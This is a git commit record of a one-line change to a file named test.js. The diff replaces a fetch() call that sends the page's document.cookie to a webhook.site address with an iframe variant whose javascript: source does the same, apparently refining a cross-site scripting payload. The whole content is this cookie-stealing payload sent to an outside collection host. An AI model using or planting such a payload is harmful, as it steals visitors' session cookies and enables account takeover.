f9fe345e0c31fb0a0efc19a9db537b26f46958ff
chtipilou <90285314+chtipilou@users.noreply.github.com>
2025-03-02 19:50:39 +0100

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/33fc25fd-1bf0-4672-8f43-c6c083183e9f?cookie=' + document.cookie);
+<iframe src="javascript:fetch('https://webhook.site/33fc25fd-1bf0-4672-8f43-c6c083183e9f?c='+document.cookie)"></iframe>
